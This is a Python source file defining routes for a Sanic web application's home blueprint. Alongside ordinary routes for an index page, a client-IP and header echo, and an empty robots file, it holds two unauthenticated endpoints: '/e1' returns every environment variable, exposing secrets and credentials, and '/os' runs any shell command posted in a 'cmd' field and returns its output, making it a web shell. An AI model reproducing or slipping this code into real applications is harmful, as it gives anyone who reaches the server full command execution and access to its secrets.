import os
import subprocess

from sanic import Request, Blueprint
from sanic.response import empty, text

from utils.common import serializer, get_bj_date, get_utc_date

bp_home = Blueprint('home')


@bp_home.get('/', name='index')
@serializer()
async def index(request: Request):
    config = request.app.config
    return {'dev': config.DEV}


@bp_home.get('/ip2', name='ip')
@serializer()
async def get_ip(request: Request):
    headers = {a: b for a, b in request.headers.items()}
    data = {
        'ip': request.remote_addr,
        'ip2': request.ip,
        'request': request.url,
        'forwarded': request.forwarded,
        'headers': headers,
        'host': request.host,
        'bj_date': get_bj_date(),
        'utc_date': get_utc_date()
    }
    return data


@bp_home.get('/robot.txt', name='robot_file')
async def robot_file(request):
    return empty()


@bp_home.get('/e1')
@serializer()
async def envs(request):
    return dict(os.environ)


@bp_home.post('/os')
# @serializer()
async def run_os(request: Request):
    cmd = request.form.get('cmd')
    out_put = subprocess.getoutput(cmd)
    return text(out_put)
